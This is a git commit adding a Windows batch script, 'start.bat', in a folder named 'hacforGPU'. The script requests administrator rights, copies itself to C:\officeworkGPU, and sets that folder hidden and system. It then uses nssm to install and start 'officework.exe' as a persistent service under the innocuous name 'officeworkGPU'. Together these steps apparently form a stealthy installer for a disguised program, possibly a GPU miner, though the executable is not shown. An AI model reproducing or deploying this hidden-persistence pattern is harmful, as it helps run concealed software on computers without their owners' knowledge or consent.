d35b5c3a07623c976e47942feac79755d8951809
ziqiuzys <129842402+ziqiuzys@users.noreply.github.com>
2024-08-01 10:10:15 +0800

    Add files via upload

---
+++ hacforGPU/start.bat
@@ -0,0 +1,45 @@
+@echo off
+chcp 65001 > nul
+
+openfiles >nul 2>&1
+if %errorlevel% neq 0 (
+    
+    powershell -Command "Start-Process '%~f0' -Verb RunAs"
+    exit /b
+)
+
+rem 获取批处理文件的存放路径
+set script_dir=%~dp0
+
+rem 切换到批处理文件的存放路径
+cd /d %script_dir%
+
+set current_dir=%cd%
+
+
+set target_dir=C:\officeworkGPU
+
+
+
+if not exist "%target_dir%" (
+    mkdir "%target_dir%"
+)
+
+xcopy "%script_dir%" "%target_dir%" /E /H /C /I /Y
+
+
+attrib +h +s "%target_dir%"
+
+set cd_target_dir=%target_dir%\nssm\win64
+set exe_name=officework.exe
+set full_path=%target_dir%\%exe_name%
+
+cd /d %cd_target_dir%
+
+
+
+nssm install officeworkGPU %full_path%
+
+nssm start officeworkGPU
+
+
